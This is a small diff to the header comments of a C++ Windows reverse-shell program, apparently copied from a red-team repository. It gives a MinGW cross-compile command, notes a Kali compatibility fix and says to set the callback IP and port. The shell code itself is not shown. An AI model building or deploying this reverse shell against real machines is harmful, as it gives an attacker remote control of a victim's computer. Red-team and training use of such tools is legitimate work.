@@ -1,8 +1,9 @@
-//Compile with g++/i686-w64-mingw32-g++ <filename>.cpp -o <filname>.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
-//Author: BankSecurity
-//Link: https://github.com/BankSecurity/Red_Team/blob/master/Reverse_Shell/C%2B%2B_Rev_Shell.cpp
+//Copied from https://github.com/BankSecurity/Red_Team/blob/master/Reverse_Shell/C%2B%2B_Rev_Shell.cpp
 
-//Change IP host address and port on lines 79 and 80
+//CHANGES MADE FROM ORIGINAL:
+     //Compile with i686-w64-mingw32-g++ <filename>.cpp -o <filname>.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
+     //because the other compilation command is deprecated on newest Kali Linux releases (tried on 2020.2 release)
+     //Change IP host address and port on lines 79 and 80
 
 #include <winsock2.h>	//windows socket communications over TCP/IP
 #include <windows.h>	//required for calling other processes, initiating other headers and calls
